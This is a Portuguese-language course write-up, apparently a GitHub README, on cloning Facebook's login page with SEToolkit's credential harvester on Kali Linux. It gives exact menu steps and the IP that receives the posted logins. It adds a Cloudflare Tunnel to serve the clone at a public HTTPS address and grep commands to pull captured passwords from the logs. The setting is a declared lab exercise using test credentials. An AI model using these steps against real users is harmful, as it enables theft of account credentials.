# 🎣 Criando um Phishing com Kali Linux (DIO)

> ⚠️ **Aviso Importante:** Este projeto foi desenvolvido exclusivamente para fins educacionais em um ambiente controlado de laboratório, como parte do desafio da DIO. Nenhuma credencial real deve ser utilizada. O objetivo é demonstrar conceitos de engenharia social e conscientização em segurança da informação.

---

## 📌 Sobre o Projeto

Este projeto demonstra a utilização do **Social-Engineer Toolkit (SEToolkit)** no **Kali Linux** para clonar a página de login do Facebook e capturar credenciais em um ambiente de testes.

Durante o desenvolvimento, também foram realizados testes adicionais com:

* Publicação da aplicação via Cloudflare Tunnel (HTTPS)
* Análise detalhada dos logs gerados
* Comparação entre acesso por IP e por URL pública
* Teste com a página do Instagram

---

## 🎯 Objetivos de Aprendizagem

Ao concluir este projeto, foi possível:

* Aplicar conceitos de phishing em ambiente controlado
* Utilizar o SEToolkit no Kali Linux
* Clonar páginas de login
* Capturar e analisar requisições HTTP POST
* Interpretar logs contendo credenciais
* Utilizar GitHub para documentação e versionamento
* Entender o impacto do JavaScript no envio de senhas

---

## 🛠️ Tecnologias Utilizadas

* Kali Linux
* Social-Engineer Toolkit (SEToolkit)
* Python HTTP Server
* Cloudflare Tunnel (opcional)
* Git e GitHub

---

## 🖥️ Ambiente de Laboratório

| Item                         | Descrição         |
| ---------------------------- | ----------------- |
| Sistema Operacional          | Kali Linux        |
| Máquina                      | Virtual Machine   |
| Ferramenta Principal         | SEToolkit         |
| Servidor Web                 | Porta 80          |
| Exposição Externa (Opcional) | Cloudflare Tunnel |

---

## 🚀 Execução do Projeto

### 1. Abrir o SEToolkit

```bash
sudo setoolkit
```

### 2. Selecionar as opções

```text
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack Method
2) Site Cloner
```

### 3. Informar o IP para POST

```text
192.168.3.142
```

### 4. Informar a URL a ser clonada

```text
http://www.facebook.com
```

### 5. Iniciar o servidor de captura

O SEToolkit iniciará automaticamente o Credential Harvester na porta 80.

---

## 🌐 Acesso à Página Clonada

### Via IP local

```text
http://192.168.3.142
```

### Via Cloudflare Tunnel (para testes do eu interesse)

#### Baixar o pacote .deb do cloudflared

```bash
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
```

#### Instalar o pacote

```bash
sudo dpkg -i cloudflared-linux-amd64.deb
```

#### Corrigir dependências, se necessário

```bash
sudo apt --fix-broken install -y
```

#### Verificar se a instalação foi concluída

```bash
cloudflared --version
```

#### Criar um túnel para a aplicação rodando na porta 80

```bash
cloudflared tunnel --url http://localhost:80
```

Exemplo de URL gerada:

```text
https://sku-americans-concerned-generated.trycloudflare.com
```

---

## 📋 Comandos Utilizados

### Verificar se o servidor está na porta 80

```bash
sudo ss -tulpn | grep :80
```

### Testar localmente

```bash
curl http://localhost
```

### Verificar versão do cloudflared

```bash
cloudflared --version
```

### Buscar credenciais nos logs

```bash
grep -R "identifier" ~/.set
```

```bash
grep -R "password" ~/.set
```

---

## 📸 Evidências (Screenshots)

> Adicione as imagens na pasta `images/`.

### Estrutura sugerida

```text
images/
├── 01-setoolkit-menu.png
├── 02-facebook-clonado.png
├── 03-credenciais-capturadas.png
├── 04-cloudflare-tunnel-log.png
├── 05-page-cloudflare-tunnel.png
```

### Exemplos no README

```markdown
![Menu do SEToolkit](images/01-setoolkit-menu.png)
![Página clonada](images/02-facebook-clonado.png)
![Credenciais capturadas](images/03-credenciais-capturadas.png)
![Log do Cloudflare Tunnel](images/04-cloudflare-tunnel-log.png)
![Página acessada via Cloudflare Tunnel](images/05-page-cloudflare-tunnel.png)
```

---

## 🔍 Exemplo de Captura de Credenciais

```json
"identifier":"teste@gmail.com",
"password":{"sensitive_string_value":"Teste123456"}
```

### Resultado

* Usuário: `teste@gmail.com`
* Senha: `Teste123456`

---

## 🧠 Descoberta Técnica Importante

Durante os testes, foi observado que a senha pode ser enviada de duas formas diferentes.

### 1. Texto puro

```json
"password":{"sensitive_string_value":"Teste123456"}
```

### 2. Formato protegido

```json
"password":{"sensitive_string_value":"#PWD_BROWSER:5:..."}
```

### Explicação

O JavaScript da página do Facebook pode processar a senha antes do envio, dependendo do contexto de execução do navegador.

### Comportamento observado

| Método de acesso                                   | Resultado                       |
| -------------------------------------------------- | ------------------------------- |
| IP local (`http://192.168.x.x`)                    | Senha em texto claro            |
| Cloudflare Tunnel (`https://...trycloudflare.com`) | Senha no formato `#PWD_BROWSER` |

---

## ☁️ Testes com Cloudflare Tunnel

Como melhoria opcional, foi utilizado Cloudflare Tunnel para expor a aplicação com HTTPS sem necessidade de abrir portas no roteador.

### Benefícios

* HTTPS automático
* URL pública temporária
* Não expõe o IP diretamente

### Observação

Ao utilizar HTTPS, o JavaScript do Facebook passou a enviar a senha em um formato protegido (`#PWD_BROWSER`). Mesmo assim, o campo foi capturado corretamente.

---

## 📁 Estrutura do Repositório

```text
cibersecurity-desafio-phishing/
├── README.md
└── images/
    ├── 01-setoolkit-menu.png
    ├── 02-facebook-clonado.png
    ├── 03-credenciais-capturadas.png
    ├── 04-cloudflare-tunnel.png
    └── 04-cloudflare-tunnel.png
```

---

## 📚 Conceitos Aplicados

* Engenharia Social
* Phishing
* Credential Harvesting
* HTTP POST
* Análise de Logs
* JavaScript no Cliente
* HTTPS/TLS
* DNS e Tunelamento

---

## 🧪 Conclusão

Este projeto permitiu compreender, na prática, como funciona uma campanha de phishing em ambiente controlado, desde a clonagem da página até a captura e análise das credenciais.

Além da execução do desafio proposto, foram realizados testes adicionais com Cloudflare Tunnel e análise do comportamento do JavaScript do Facebook, ampliando significativamente o aprendizado.

---

## 📎 Referências

* [https://github.com/cassiano-dio/cibersecurity-desafio-phishing](https://github.com/cassiano-dio/cibersecurity-desafio-phishing)
* [https://github.com/trustedsec/social-engineer-toolkit](https://github.com/trustedsec/social-engineer-toolkit)
* [https://www.kali.org/](https://www.kali.org/)
* [https://www.cloudflare.com/products/tunnel/](https://www.cloudflare.com/products/tunnel/)

---

## 👩‍💻 Autora

**Fernanda Barberato**

Projeto desenvolvido como parte da formação em Cybersecurity da DIO.

* GitHub: `https://github.com/ferz1306`
* LinkedIn: `https://www.linkedin.com/in/fernanda-barberato/`

---

# 🚀 Publicando no GitHub

## Inicializar o repositório

```bash
git init
git add .
git commit -m "feat: adiciona projeto de phishing com SEToolkit"
```

## Criar branch principal

```bash
git branch -M main
```

## Adicionar repositório remoto

```bash
git remote add origin https://github.com/ferz1306/cibersecurity-desafio-phishing.git
```

## Enviar para o GitHub

```bash
git push -u origin main
```

---

## 🏆 Diferenciais do Projeto

* Implementação além do escopo do desafio
* Exposição via Cloudflare Tunnel
* Investigação do comportamento do JavaScript
* Comparação entre HTTP e HTTPS
* Testes com múltiplas páginas
* Documentação detalhada
